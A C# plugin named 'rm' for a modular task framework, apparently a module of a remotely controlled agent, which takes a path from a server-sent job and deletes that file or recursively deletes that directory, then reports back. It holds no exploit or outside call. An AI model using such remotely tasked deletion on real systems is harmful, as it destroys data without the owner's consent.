using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using rm;
using System.Text.Json;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "rm";
        private IDataBroker messageManager { get; set; }
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            RmArgs args = JsonSerializer.Deserialize<RmArgs>(job.task.parameters);

            if(!args.Validate(out string message))
            {
                DebugLog.Log($"{Name} validation failed [{job.task.id}]");
                messageManager.Write(message, job.task.id, true, "error");
                return;
            }

            try
            {
                FileAttributes attr = File.GetAttributes(args.path);
                if (attr.HasFlag(FileAttributes.Directory))
                {
                    DebugLog.Log($"{Name} deleting directory '{args.path}' [{job.task.id}]");
                    Directory.Delete(args.path.Replace("\"", ""), true);
                }
                else
                {
                    DebugLog.Log($"{Name} deleting file '{args.path}' [{job.task.id}]");
                    File.Delete(args.path.Replace("\"", ""));
                }
                messageManager.Write($"{args.path} removed.", job.task.id, true);
                DebugLog.Log($"{Name} completed [{job.task.id}]");
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
                return;
            }
        }
    }
}
